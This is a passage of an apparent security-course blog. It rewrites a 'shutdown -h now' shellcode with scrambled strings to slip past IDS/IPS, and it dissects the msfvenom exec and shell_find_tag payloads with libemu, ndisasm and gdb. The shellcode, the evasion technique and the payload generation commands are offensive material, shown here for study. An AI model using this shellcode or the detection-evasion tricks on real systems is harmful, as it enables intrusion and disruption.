<p>Original shellcode was 28 bytes; 28 x 1,5 = 42, so 40 is acceptable.</p>

<p>Test to execute the shellcode:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot $ ./shellcode-setuid_execve 
Shellcode length: 40
$ 
</code></pre>
</div>

<p><br /></p>
<h2 id="shellcode-3---shutdown--h">Shellcode 3 - ‘shutdown -h’</h2>

<p>The third shellcode is the <a href="http://shell-storm.org/shellcode/files/shellcode-876.php">shutdown -h now Shellcode</a>.</p>

<p>The shellcode executes the ‘shutdown’ command with the parameters ‘-h’ and ‘now’, which casuses the computer to be turned off immediately, no questions asked.</p>

<p>The original shellcode is 56 bytes and is as follows:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>Disassembly of section .text:

08048060 &lt;_start&gt;:
8048060:    31 c0                   xor    eax,eax
8048062:    31 d2                   xor    edx,edx
8048064:    50                      push   eax
8048065:    66 68 2d 68             pushw  0x682d
8048069:    89 e7                   mov    edi,esp
804806b:    50                      push   eax
804806c:    6a 6e                   push   0x6e
804806e:    66 c7 44 24 01 6f 77    mov    WORD PTR [esp+0x1],0x776f
8048075:    89 e7                   mov    edi,esp
8048077:    50                      push   eax
8048078:    68 64 6f 77 6e          push   0x6e776f64
804807d:    68 73 68 75 74          push   0x74756873
8048082:    68 6e 2f 2f 2f          push   0x2f2f2f6e
8048087:    68 2f 73 62 69          push   0x6962732f
804808c:    89 e3                   mov    ebx,esp
804808e:    52                      push   edx
804808f:    56                      push   esi
8048090:    57                      push   edi
8048091:    53                      push   ebx
8048092:    89 e1                   mov    ecx,esp
8048094:    b0 0b                   mov    al,0xb
8048096:    cd 80                   int    0x80
</code></pre>
</div>
<p>Appart from rewriting the code to use other instructions, we will need to scramble some strings so that they wont be recognised by IDS/IPS as easily.</p>

<p>We need to keep the shellcode under 84 bytes (56 * 1.5 = 84).</p>

<p>Rewrite to the following, commented, code…</p>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code>        <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>            <span class="c">; Clear eax,</span>
        <span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="n">eax</span>            <span class="c">; and ebx</span>
        <span class="c">; Put </span>
        <span class="k">push</span>    <span class="n">edx</span>             <span class="c">; Push 0</span>
        <span class="k">push</span>    <span class="n">word</span> <span class="mh">0x682d</span>     <span class="c">; Push '-h'</span>

        <span class="k">mov</span>     <span class="n">edi</span><span class="p">,</span><span class="n">esp</span>         <span class="c">; Put address to '-h' in edi</span>
        <span class="k">push</span>    <span class="n">eax</span>             <span class="c">; Push 0</span>
        <span class="k">push</span>    <span class="n">dword</span> <span class="mh">0x776f6e</span>  <span class="c">; Push 'won' (now)</span>
        <span class="k">mov</span>     <span class="n">edi</span><span class="p">,</span><span class="n">esp</span>         <span class="c">; Address to 'now' in edi</span>

        <span class="c">; Put the string "/sbin/shutdown" on stack</span>
        <span class="k">push</span>    <span class="n">edx</span>             <span class="c">; push 0</span>
        <span class="k">mov</span>     <span class="n">esi</span><span class="p">,</span> <span class="mh">0x6e776f60</span> <span class="c">; string 'nwo`'</span>
        <span class="k">add</span>     <span class="n">esi</span><span class="p">,</span> <span class="mh">0x4</span>        <span class="c">; to get nwod (down)</span>
        <span class="k">push</span>    <span class="n">esi</span>             <span class="c">; push it</span>
        <span class="k">mov</span>     <span class="n">esi</span><span class="p">,</span> <span class="mh">0x74756879</span> <span class="c">; string 'tuh?'</span>
        <span class="k">sub</span>     <span class="n">esi</span><span class="p">,</span> <span class="mh">0x6</span>        <span class="c">; to get tuhs (shut)</span>
        <span class="k">push</span>    <span class="n">esi</span>             <span class="c">; push it</span>
        <span class="k">mov</span>     <span class="n">esi</span><span class="p">,</span> <span class="mh">0x2f2f6e60</span> <span class="c">; string '//n`'</span>
        <span class="k">add</span>     <span class="n">esi</span><span class="p">,</span> <span class="mh">0x9</span>        <span class="c">; to get 'ni//' (in//)</span>
        <span class="k">push</span>    <span class="n">esi</span>             <span class="c">; push it</span>
        <span class="k">mov</span>     <span class="n">esi</span><span class="p">,</span> <span class="mh">0x62732f2a</span> <span class="c">; string 'bs/*'</span>
        <span class="k">add</span>     <span class="n">esi</span><span class="p">,</span> <span class="mh">0x5</span>        <span class="c">; to get 'sb//' (//sb) </span>
        <span class="k">push</span>    <span class="n">esi</span>             <span class="c">; push it</span>
        <span class="c">; Set up the syscall</span>
        <span class="k">mov</span>     <span class="n">al</span><span class="p">,</span><span class="mh">0x9</span>          <span class="c">; Syscall execve (scrambled).. </span>
        <span class="k">add</span>     <span class="n">al</span><span class="p">,</span> <span class="mi">2</span>           <span class="c">; .. needs to be 11</span>
        <span class="k">mov</span>     <span class="n">ebx</span><span class="p">,</span><span class="n">esp</span>         <span class="c">; Address of "/sbin/shutdown' to ebx </span>
        <span class="k">push</span>    <span class="n">edx</span>             <span class="c">; Push 0 (string terminator)</span>
        <span class="k">push</span>    <span class="n">edi</span>             <span class="c">; Push address of 'now' </span>
        <span class="k">push</span>    <span class="n">ebx</span>             <span class="c">; Address of string to execute</span>
        <span class="k">mov</span>     <span class="n">ecx</span><span class="p">,</span><span class="n">esp</span>         <span class="c">; Address of "shutdown -h now" to ecx</span>
        <span class="k">int</span>     <span class="mh">0x80</span>            <span class="c">; Execute syscall</span>
</code></pre>
</div>

<p>Compile and insert into our “shellcode executor”, we can see that it now is 69 bytes, well within the allowed size restriction.</p>

<p>Execute the shellcode and our computer is instantly restarted…</p>

<p>All code and scripts can be found in the repository: <a href="https://github.com/rtmcx/SLAE">https://github.com/rtmcx/SLAE</a>.</p>

<hr />

<p>This blog post has been created for completing the requirements of the <a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">SecurityTube Linux Assembly Expert certification</a>.</p>

<p>Student ID: PA-0726</p>

  </div><!-- /.entry-content -->
</article><!-- /.hentry -->

<article class="hentry">
  <header>
    
      <div class="entry-image-index">
        <a href="https://rtmcx.github.io/SLAE-Assignment-5_3/" title="SLAE Assignment 5 (3/3)"><img src="https://rtmcx.github.io/images/assignment-1.jpg" alt="SLAE Assignment 5 (3/3)"></a>
      </div><!-- /.entry-image -->
    
    <div class="entry-meta">
      <span class="entry-date date published updated"><time datetime="2017-05-06T00:00:00+00:00"><a href="https://rtmcx.github.io/SLAE-Assignment-5_3/">May 06, 2017</a></time></span><span class="author vcard"><span class="fn"><a href="https://rtmcx.github.io/about/" title="About rtmcx">rtmcx</a></span></span>
      
      <span class="entry-reading-time">
        <i class="fa fa-clock-o"></i>
        
Reading time ~3 minutes
      </span><!-- /.entry-reading-time -->
      
    </div><!-- /.entry-meta -->
    
      <h1 class="entry-title"><a href="https://rtmcx.github.io/SLAE-Assignment-5_3/" rel="bookmark" title="SLAE Assignment 5 (3/3)" itemprop="url">SLAE Assignment 5 (3/3)</a></h1>
    
  </header>
  <div class="entry-content">
    <h1 id="dissecting-msfvenom-payloads-linuxx86">Dissecting Msfvenom Payloads (Linux/x86)</h1>

<h2 id="requirements">Requirements</h2>

<ul>
  <li>Take up at least 3 shellcode samples created using msfvenom  for linux/x86</li>
  <li>Use GDB/Ndisasm/Libemu to dissect the
funcSonality of the shellcode</li>
  <li>Present your analysis</li>
</ul>

<h2 id="linuxx86exec">linux/x86/exec</h2>

<p>The third payload is “linux/x86/exec”.</p>

<div class="language-bash highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot <span class="nv">$ </span>msfvenom -p linux/x86/exec --payload-options
....
     Name: Linux Execute Command
     Module: payload/linux/x86/exec

Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
CMD                    yes       The <span class="nb">command </span>string to execute     

Description:
  Execute an arbitrary <span class="nb">command</span>
</code></pre>
</div>
<p>So lets generate a shellcode that executes the command ‘id’ and feed it to libemu:s sctest.</p>
<div class="language-bash highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot <span class="nv">$ </span>msfvenom -p linux/x86/exec <span class="nv">CMD</span><span class="o">=</span>id R | sctest -v -sS 10000 -G exec.dot
verbose <span class="o">=</span> 1 
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 38 bytes

execve
int execve <span class="o">(</span>const char <span class="k">*</span><span class="nv">dateiname</span><span class="o">=</span><span class="nv">00416fc0</span><span class="o">={</span>/bin/sh<span class="o">}</span>, const char <span class="k">*</span> argv[], const char <span class="k">*</span>envp[]<span class="o">)</span>;
cpu error error accessing 0x00000004 not mapped

stepcount 15
int execve <span class="o">(</span>
     const char <span class="k">*</span> dateiname <span class="o">=</span> 0x00416fc0 <span class="o">=</span>&gt; 
           <span class="o">=</span> <span class="s2">"/bin/sh"</span>;
     const char <span class="k">*</span> argv[] <span class="o">=</span> <span class="o">[</span>
           <span class="o">=</span> 0x00416fb0 <span class="o">=</span>&gt; 
               <span class="o">=</span> 0x00416fc0 <span class="o">=</span>&gt; 
                   <span class="o">=</span> <span class="s2">"/bin/sh"</span>;
           <span class="o">=</span> 0x00416fb4 <span class="o">=</span>&gt; 
               <span class="o">=</span> 0x00416fc8 <span class="o">=</span>&gt; 
                   <span class="o">=</span> <span class="s2">"-c"</span>;
           <span class="o">=</span> 0x00416fb8 <span class="o">=</span>&gt; 
               <span class="o">=</span> 0x0041701d <span class="o">=</span>&gt; 
                   <span class="o">=</span> <span class="s2">"id"</span>;
           <span class="o">=</span> 0x00000000 <span class="o">=</span>&gt; 
             none;
     <span class="o">]</span>;
     const char <span class="k">*</span> envp[] <span class="o">=</span> 0x00000000 <span class="o">=</span>&gt; 
         none;
<span class="o">)</span> <span class="o">=</span>  0;
</code></pre>
</div>
<p>Nice output. Since we generated a .dot-file, we can convert that file into a .png and see the flow of the code…</p>
<div class="highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot $ dot -Tpng exec.dot -o exec.png
</code></pre>
</div>
<p>This resulted in this output:
<img src="/images/exec.png" /></p>

<p>Let’s take the shellcode, insert it into our ‘shellcode-executor’, compile and open up the shellcode in gdb (with gdb-peda installed).</p>

<div class="language-bash highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot <span class="nv">$ </span>gdb -q ./shellcode
</code></pre>
</div>
<p>Set a breakpoint where out code is about to be executed</p>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">break</span> <span class="o">*&amp;</span><span class="n">code</span>
<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x2040</span>
<span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">r</span>
<span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">disassemble</span>
<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">code</span><span class="o">:</span>
<span class="o">=&gt;</span> <span class="mh">0x80002040</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="mh">0xb</span>
   <span class="mh">0x80002042</span> <span class="o">&lt;+</span><span class="mi">2</span><span class="o">&gt;:</span>	<span class="k">pop</span>    <span class="n">eax</span>
   <span class="mh">0x80002043</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span>	<span class="k">cdq</span>    
   <span class="mh">0x80002044</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="n">edx</span>
   <span class="mh">0x80002045</span> <span class="o">&lt;+</span><span class="mi">5</span><span class="o">&gt;:</span>	<span class="n">pushw</span>  <span class="mh">0x632d</span>
   <span class="mh">0x80002049</span> <span class="o">&lt;+</span><span class="mi">9</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="n">esp</span>
   <span class="mh">0x8000204b</span> <span class="o">&lt;+</span><span class="mi">11</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="mh">0x68732f</span>
   <span class="mh">0x80002050</span> <span class="o">&lt;+</span><span class="mi">16</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="mh">0x6e69622f</span>
   <span class="mh">0x80002055</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">ebx</span><span class="p">,</span><span class="n">esp</span>
   <span class="mh">0x80002057</span> <span class="o">&lt;+</span><span class="mi">23</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="n">edx</span>
   <span class="mh">0x80002058</span> <span class="o">&lt;+</span><span class="mi">24</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x80002060</span> <span class="o">&lt;</span><span class="n">code</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;</span>
   <span class="mh">0x8000205d</span> <span class="o">&lt;+</span><span class="mi">29</span><span class="o">&gt;:</span>	<span class="k">imul</span>   <span class="n">esp</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">eax</span><span class="o">+</span><span class="n">eax</span><span class="o">*</span><span class="mi">1</span><span class="o">+</span><span class="mh">0x57</span><span class="err">]</span><span class="p">,</span><span class="mh">0xcde18953</span>
   <span class="mh">0x80002061</span> <span class="o">&lt;+</span><span class="mi">33</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="n">ebx</span>
   <span class="mh">0x80002062</span> <span class="o">&lt;+</span><span class="mi">34</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">esp</span>
   <span class="mh">0x80002064</span> <span class="o">&lt;+</span><span class="mi">36</span><span class="o">&gt;:</span>	<span class="k">int</span>    <span class="mh">0x80</span>

</code></pre>
</div>
<p>Looks like there is some mismatch in the disassembly as the call at +24 wants to jump to the instruction at +32 (which is in another instruction).</p>

<p>Lets continue stepping through the code until the syscall is about to be executed and examine the stack:</p>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code> <span class="err">[</span><span class="o">----------------------------------</span><span class="n">registers</span><span class="o">-----------------------------------</span><span class="err">]</span>
<span class="n">EAX</span><span class="o">:</span> <span class="mh">0xb</span> <span class="p">(</span><span class="sc">'\x0b'</span><span class="p">)</span>
<span class="n">EBX</span><span class="o">:</span> <span class="mh">0xbffff2fe</span> <span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">)</span>
<span class="n">ECX</span><span class="o">:</span> <span class="mh">0xbffff2ee</span> <span class="o">--&gt;</span> <span class="mh">0xbffff2fe</span> <span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">)</span>
<span class="n">EDX</span><span class="o">:</span> <span class="mh">0x0</span> 
<span class="n">ESI</span><span class="o">:</span> <span class="mh">0x1</span> 
<span class="n">EDI</span><span class="o">:</span> <span class="mh">0xbffff306</span> <span class="o">--&gt;</span> <span class="mh">0x632d</span> <span class="p">(</span><span class="err">'</span><span class="o">-</span><span class="n">c</span><span class="err">'</span><span class="p">)</span>
<span class="n">EBP</span><span class="o">:</span> <span class="mh">0xbffff328</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="n">ESP</span><span class="o">:</span> <span class="mh">0xbffff2ee</span> <span class="o">--&gt;</span> <span class="mh">0xbffff2fe</span> <span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">)</span>
<span class="n">EIP</span><span class="o">:</span> <span class="mh">0x80002064</span> <span class="o">--&gt;</span> <span class="mh">0x80cd</span>
<span class="n">EFLAGS</span><span class="o">:</span> <span class="mh">0x282</span> <span class="p">(</span><span class="n">carry</span> <span class="n">parity</span> <span class="n">adjust</span> <span class="n">zero</span> <span class="n">SIGN</span> <span class="n">trap</span> <span class="n">INTERRUPT</span> <span class="n">direction</span> <span class="n">overflow</span><span class="p">)</span>
<span class="err">[</span><span class="o">-------------------------------------</span><span class="n">code</span><span class="o">-------------------------------------</span><span class="err">]</span>
   <span class="mh">0x8000205c</span> <span class="o">&lt;</span><span class="n">code</span><span class="o">+</span><span class="mi">28</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">ecx</span><span class="o">+</span><span class="mh">0x64</span><span class="err">]</span><span class="p">,</span><span class="n">ch</span>
   <span class="mh">0x8000205f</span> <span class="o">&lt;</span><span class="n">code</span><span class="o">+</span><span class="mi">31</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">edi</span><span class="o">+</span><span class="mh">0x53</span><span class="err">]</span><span class="p">,</span><span class="n">dl</span>
   <span class="mh">0x80002062</span> <span class="o">&lt;</span><span class="n">code</span><span class="o">+</span><span class="mi">34</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">esp</span>
<span class="o">=&gt;</span> <span class="mh">0x80002064</span> <span class="o">&lt;</span><span class="n">code</span><span class="o">+</span><span class="mi">36</span><span class="o">&gt;:</span>	<span class="k">int</span>    <span class="mh">0x80</span>
   <span class="mh">0x80002066</span> <span class="o">&lt;</span><span class="n">code</span><span class="o">+</span><span class="mi">38</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[eax],</span><span class="n">al</span>
   <span class="mh">0x80002068</span><span class="o">:</span>	<span class="k">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[eax],</span><span class="n">al</span>
   <span class="mh">0x8000206a</span><span class="o">:</span>	<span class="k">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[eax],</span><span class="n">al</span>
   <span class="mh">0x8000206c</span><span class="o">:</span>	<span class="k">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[eax],</span><span class="n">al</span>
<span class="err">[</span><span class="o">------------------------------------</span><span class="n">stack</span><span class="o">-------------------------------------</span><span class="err">]</span>
<span class="mi">0000</span><span class="o">|</span> <span class="mh">0xbffff2ee</span> <span class="o">--&gt;</span> <span class="mh">0xbffff2fe</span> <span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">)</span>
<span class="mi">0004</span><span class="o">|</span> <span class="mh">0xbffff2f2</span> <span class="o">--&gt;</span> <span class="mh">0xbffff306</span> <span class="o">--&gt;</span> <span class="mh">0x632d</span> <span class="p">(</span><span class="err">'</span><span class="o">-</span><span class="n">c</span><span class="err">'</span><span class="p">)</span>
<span class="mi">0008</span><span class="o">|</span> <span class="mh">0xbffff2f6</span> <span class="o">--&gt;</span> <span class="mh">0x8000205d</span> <span class="o">--&gt;</span> <span class="mh">0x57006469</span> <span class="p">(</span><span class="err">'</span><span class="n">id</span><span class="err">'</span><span class="p">)</span>
<span class="mi">0012</span><span class="o">|</span> <span class="mh">0xbffff2fa</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="mi">0016</span><span class="o">|</span> <span class="mh">0xbffff2fe</span> <span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">)</span>
<span class="mi">0020</span><span class="o">|</span> <span class="mh">0xbffff302</span> <span class="o">--&gt;</span> <span class="mh">0x68732f</span> <span class="p">(</span><span class="err">'</span><span class="o">/</span><span class="n">sh</span><span class="err">'</span><span class="p">)</span>
<span class="mi">0024</span><span class="o">|</span> <span class="mh">0xbffff306</span> <span class="o">--&gt;</span> <span class="mh">0x632d</span> <span class="p">(</span><span class="err">'</span><span class="o">-</span><span class="n">c</span><span class="err">'</span><span class="p">)</span>
<span class="mi">0028</span><span class="o">|</span> <span class="mh">0xbffff30a</span> <span class="o">--&gt;</span> <span class="mh">0x6200000</span> 
<span class="err">[</span><span class="o">------------------------------------------------------------------------------</span><span class="err">]</span>
<span class="n">Legend</span><span class="o">:</span> <span class="n">code</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">rodata</span><span class="p">,</span> <span class="n">value</span>
<span class="mh">0x80002064</span> <span class="k">in</span> <span class="n">code</span> <span class="p">()</span>
<span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> 
</code></pre>
</div>

<p>We can see that the registers has been setup to execute the syscall for Execve.</p>

<p>EAX = 0xB (syscall for Execve)
EBX = Pointer to filename (‘/bin/sh’)
EXC = Argv for execve (same as EBX)
EDX = NULL</p>

<p>We can see on the stack how the arguments to execve, with the argument of the program we want to execute, are setup for the call.</p>

<p>Continue executing the Execve-syscall and we get our execution of the ‘id’-command.</p>
<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">c</span>
<span class="n">Continuing</span><span class="p">.</span>
<span class="n">process</span> <span class="mi">4283</span> <span class="n">is</span> <span class="n">executing</span> <span class="n">new</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">dash</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">rtmcx</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">rtmcx</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">rtmcx</span><span class="p">),</span><span class="mi">24</span><span class="p">(</span><span class="n">cdrom</span><span class="p">),</span><span class="mi">25</span><span class="p">(</span><span class="n">floppy</span><span class="p">),</span><span class="mi">27</span><span class="p">(</span><span class="n">sudo</span><span class="p">),</span><span class="mi">29</span><span class="p">(</span><span class="n">audio</span><span class="p">),</span><span class="mi">30</span><span class="p">(</span><span class="n">dip</span><span class="p">),</span><span class="mi">44</span><span class="p">(</span><span class="n">video</span><span class="p">),</span><span class="mi">46</span><span class="p">(</span><span class="n">plugdev</span><span class="p">),</span><span class="mi">108</span><span class="p">(</span><span class="n">netdev</span><span class="p">),</span><span class="mi">123</span><span class="p">(</span><span class="n">debian</span><span class="o">-</span><span class="n">tor</span><span class="p">),</span><span class="mi">130</span><span class="p">(</span><span class="n">bluetooth</span><span class="p">)</span>
<span class="err">[</span><span class="n">Inferior</span> <span class="mi">2</span> <span class="p">(</span><span class="n">process</span> <span class="mi">4372</span><span class="p">)</span> <span class="n">exited</span> <span class="n">normally</span><span class="err">]</span>
<span class="n">Warning</span><span class="o">:</span> <span class="k">not</span> <span class="n">running</span> <span class="k">or</span> <span class="n">target</span> <span class="n">is</span> <span class="n">remote</span>
<span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> 
</code></pre>
</div>
<p>Analysis done.</p>

<p>All code and scripts can be found in the repository: <a href="https://github.com/rtmcx/SLAE">https://github.com/rtmcx/SLAE</a>.</p>

<hr />

<p>This blog post has been created for completing the requirements of the <a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">SecurityTube Linux Assembly Expert certification</a>.</p>

<p>Student ID: PA-0726</p>

  </div><!-- /.entry-content -->
</article><!-- /.hentry -->

<article class="hentry">
  <header>
    
      <div class="entry-image-index">
        <a href="https://rtmcx.github.io/SLAE-Assignment-5_2/" title="SLAE Assignment 5 (2/3)"><img src="https://rtmcx.github.io/images/assignment-1.jpg" alt="SLAE Assignment 5 (2/3)"></a>
      </div><!-- /.entry-image -->
    
    <div class="entry-meta">
      <span class="entry-date date published updated"><time datetime="2017-05-05T00:00:00+00:00"><a href="https://rtmcx.github.io/SLAE-Assignment-5_2/">May 05, 2017</a></time></span><span class="author vcard"><span class="fn"><a href="https://rtmcx.github.io/about/" title="About rtmcx">rtmcx</a></span></span>
      
      <span class="entry-reading-time">
        <i class="fa fa-clock-o"></i>
        
Reading time ~3 minutes
      </span><!-- /.entry-reading-time -->
      
    </div><!-- /.entry-meta -->
    
      <h1 class="entry-title"><a href="https://rtmcx.github.io/SLAE-Assignment-5_2/" rel="bookmark" title="SLAE Assignment 5 (2/3)" itemprop="url">SLAE Assignment 5 (2/3)</a></h1>
    
  </header>
  <div class="entry-content">
    <h1 id="dissecting-msfvenom-payloads-linuxx86">Dissecting Msfvenom Payloads (Linux/x86)</h1>

<h2 id="requirements">Requirements</h2>

<ul>
  <li>Take up at least 3 shellcode samples created using msfvenom  for linux/x86</li>
  <li>Use GDB/Ndisasm/Libemu to dissect the
funcSonality of the shellcode</li>
  <li>Present your analysis</li>
</ul>

<h2 id="linuxx86shell_find_tag">linux/x86/shell_find_tag</h2>
<p>The second payload we analyse is “linux/x86/shell_find_tag”.</p>

<p>Lets see if we can get a hint of what the payload does..</p>
<div class="language-bash highlighter-rouge"><pre class="highlight"><code>;rtmcx@parrot <span class="nv">$ </span>msfvenom -p linux/x86/shell_find_tag --payload-options
Options <span class="k">for </span>payload/linux/x86/shell_find_tag:


       Name: Linux Command Shell, Find Tag Inline
     Module: payload/linux/x86/shell_find_tag
   Platform: Linux
       Arch: x86
Needs Admin: No
 Total size: 69
       Rank: Normal

Provided by:
    skape &lt;mmiller@hick.org&gt;

Description:
  Spawn a shell on an established connection <span class="o">(</span>proxy/nat safe<span class="o">)</span>


Advanced options <span class="k">for </span>payload/linux/x86/shell_find_tag:
...
    TAG                   1zsD             yes       The four byte tag to signify the connection.
</code></pre>
</div>
<p>Not much information there, lets generate the payload and feed it to “libemu:s” sctest:</p>

<div class="language-bash highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot <span class="nv">$ </span>msfvenom -p linux/x86/shell_find_tag R | sctest -vvv -Ss 10000 
</code></pre>
</div>
<p>We get a lot of output, but no psudocode was generated. 
Lets generate a ‘dot’-file that we can get a image from, and convert it to a png-file by using (the program) ‘dot’.</p>
<div class="language-bash highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot <span class="nv">$ </span>msfvenom -p linux/x86/shell_find_tag R | sctest -vvv -Ss 10000 
-G shell_find_tag.dot
graph file s.dot
verbose <span class="o">=</span> 3

rtmcx@parrot <span class="nv">$ </span>dot -Tpng shell_find_tag.dot -o shell_find_tag.png
</code></pre>
</div>

<p><img src="/images/shell_find_tag.png" /></p>

<p>Ok, we get some information, but far from a complete analysis. Gets use ndisasm to extract the instructions.</p>

<div class="language-bash highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot <span class="nv">$ </span>msfvenom -p linux/x86/shell_find_tag R | ndisasm -u -

No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 69 bytes

00000000  31DB              xor ebx,ebx
00000002  53                push ebx
00000003  89E6              mov esi,esp
00000005  6A40              push byte +0x40
00000007  B70A              mov bh,0xa
00000009  53                push ebx
0000000A  56                push esi
0000000B  53                push ebx
0000000C  89E1              mov ecx,esp
0000000E  86FB              xchg bh,bl
00000010  66FF01            inc word <span class="o">[</span>ecx]
00000013  6A66              push byte +0x66
00000015  58                pop eax
00000016  CD80              int 0x80
00000018  813E78563373      cmp dword <span class="o">[</span>esi],0x73335678
0000001E  75F0              jnz 0x10
00000020  5F                pop edi
00000021  89FB              mov ebx,edi
00000023  6A02              push byte +0x2
00000025  59                pop ecx
00000026  6A3F              push byte +0x3f
00000028  58                pop eax
00000029  CD80              int 0x80
0000002B  49                dec ecx
0000002C  79F8              jns 0x26
0000002E  6A0B              push byte +0xb
00000030  58                pop eax
00000031  99                cdq
00000032  52                push edx
00000033  682F2F7368        push dword 0x68732f2f
00000038  682F62696E        push dword 0x6e69622f
0000003D  89E3              mov ebx,esp
0000003F  52                push edx
00000040  53                push ebx
00000041  89E1              mov ecx,esp
00000043  CD80              int 0x80
</code></pre>
</div>

<p>Well, the code never lies, eh?</p>

<p>Now we go through the instructions and comment the code for clarity.</p>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">; Set up syscall for socketcall 0xA (recv)</span>
<span class="c">; recv(int sockfd, void *buf, size_t len, int flags);</span>
<span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span><span class="n">ebx</span> 
<span class="k">push</span> <span class="n">ebx</span>   		  <span class="c">; Flags-args</span>
<span class="k">mov</span> <span class="n">esi</span><span class="p">,</span><span class="n">esp</span>       
<span class="k">push</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0x40</span>	  <span class="c">; 64 bytes	      </span>
<span class="k">mov</span> <span class="n">bh</span><span class="p">,</span><span class="mh">0xa</span>        <span class="c">; Socketcall 10 = RECV</span>
<span class="k">push</span> <span class="n">ebx</span> 		  
<span class="k">push</span> <span class="n">esi</span>
<span class="k">push</span> <span class="n">ebx</span>
<span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span><span class="n">esp</span>
<span class="k">xchg</span> <span class="n">bh</span><span class="p">,</span><span class="n">bl</span>

<span class="c">; compare-loop: </span>
<span class="k">inc</span> <span class="n">word</span> <span class="p">[ecx]</span>      <span class="c">; Next connection</span>
<span class="k">push</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0x66</span>     <span class="c">; Syscall socketcall</span>
<span class="k">pop</span> <span class="n">eax</span>             <span class="c">; to eax</span>
<span class="k">int</span> <span class="mh">0x80</span>
<span class="k">cmp</span> <span class="n">dword</span> <span class="p">[esi],</span><span class="mh">0x73335678</span>  <span class="c">; Did we get our markerbytes?</span>
<span class="k">jnz</span> <span class="mh">0x10</span>            <span class="c">; No, retry. Loop compare-loop </span>

<span class="c">; Here we have found the TAG</span>
<span class="c">; Execute dup2()</span>
<span class="k">pop</span> <span class="n">edi</span>                <span class="c">; Get sockfd      </span>
<span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span><span class="n">edi</span>           <span class="c">; Save in ebx</span>
